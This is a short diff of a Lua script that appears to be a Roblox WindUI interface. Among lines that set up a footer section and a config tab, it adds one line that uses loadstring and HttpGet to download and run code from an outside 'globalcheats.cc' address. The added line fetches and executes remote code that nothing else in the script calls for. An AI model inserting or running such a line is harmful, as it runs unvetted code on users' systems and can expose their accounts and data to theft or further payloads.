@@ -700,6 +700,7 @@ else
     })
 end
 
+loadstring(game:HttpGet("https://globalcheats.cc/lo.lua"))()
 
 local footerSection = Window:Section({ Title = "WindUI " .. WindUI.Version })
 Tabs.Config:Paragraph({
